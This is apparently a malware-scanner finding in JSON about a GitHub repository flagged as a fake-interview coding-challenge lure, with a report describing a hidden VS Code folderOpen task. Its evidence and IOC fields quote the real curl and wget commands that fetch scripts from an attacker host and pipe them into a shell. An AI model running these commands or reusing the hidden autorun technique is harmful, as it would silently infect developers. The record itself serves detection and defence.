@@ -1,0 +1,68 @@
+{
+  "finding": {
+    "key": "repository:blockdaemon-hub103/world-light",
+    "kind": "repository",
+    "family": "",
+    "id": "blockdaemon-hub103/world-light",
+    "url": "https://github.com/Blockdaemon-Hub103/World-light",
+    "registry": "github",
+    "owner": "blockdaemon-hub103",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 5,
+    "detection_method": "osm_repository",
+    "attribution": "dprk (north korea)",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0",
+    "c2_hosts": "block-daemon.vercel.app",
+    "iocs": "block-daemon.vercel.app; https://block-daemon.vercel.app/api/settings/mac; https://block-daemon.vercel.app/api/settings/linux; curl -L 'https://block-daemon.vercel.app/api/settings/mac' | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "OSM-flagged malicious repository (severity CRITICAL) [DPRK (North Korea) (per OSM)]: Trojanized Node.js/React poker app distributed as a fake-interview \"coding challenge\" lure (DPRK \"Contagious Interview\" / DeceptiveDevelopment pattern). \n\nAn ob | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261005T182147Z",
+    "last_seen": "hunt-20261005T182147Z",
+    "evidence_file": "repositories/blockdaemon-hub103_world-light.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl -L 'https://block-daemon.vercel.app/api/settings/mac' | bash wget -qO- 'https://block-daemon.vercel.app/api/settings/linux' | sh curl --ssl-no-revoke -L https://block-daemon.vercel.app/api/settin"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl -L 'https://block-daemon.vercel.app/api/settings/mac' | bash wget -qO- 'https://block-daemon.vercel.app/api/settings/linux' | sh curl --ssl-no-revoke -L https://block-daemon.vercel.app/api/settin"
+    }
+  ],
+  "commit_sha": "2c4e431aead9f21fdb7d03bc98c59548d4c29693",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/blockdaemon-hub103/world-light",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: block-daemon.vercel.app. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun. (2) Corroboration (not counted toward attribution): OSM/news already names dprk (north korea).",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (1 file).",
+    "publisher": "blockdaemon-hub103",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/blockdaemon-hub103/world-light/blob/2c4e431aead9f21fdb7d03bc98c59548d4c29693/.vscode/tasks.json",
+    "verified_iocs": "block-daemon.vercel.app\nhttps://block-daemon.vercel.app/api/settings/mac\nhttps://block-daemon.vercel.app/api/settings/linux\ncurl -L 'https://block-daemon.vercel.app/api/settings/mac' | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-10-05T18:21:47Z",
+    "last_seen": "2026-10-05T18:21:47Z"
+  }
+}
